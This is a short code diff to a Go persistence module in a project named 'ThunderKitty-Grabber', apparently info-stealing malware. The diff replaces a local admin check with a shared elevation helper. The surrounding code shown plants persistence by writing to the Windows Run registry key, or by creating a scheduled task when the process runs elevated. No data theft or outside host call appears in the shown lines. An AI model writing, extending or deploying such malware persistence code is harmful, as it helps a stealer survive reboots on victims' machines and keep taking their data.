@@ -1,6 +1,7 @@
 package Persistence
 
 import (
+	Common "ThunderKitty-Grabber/utils/common"
 	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"io"
@@ -10,11 +11,6 @@ import (
 	"strings"
 	"syscall"
 )
-
-func IsAdmin() bool {
-	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
-	return ret != 0
-}
 
 func createRegistryPersistence(path string) {
 	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
@@ -83,7 +79,7 @@ func Create() {
 		return
 	}
 
-	if IsAdmin() {
+	if Common.IsElevated() {
 		createScheduledTaskPersistence(newPath)
 	} else {
 		createRegistryPersistence(newPath)
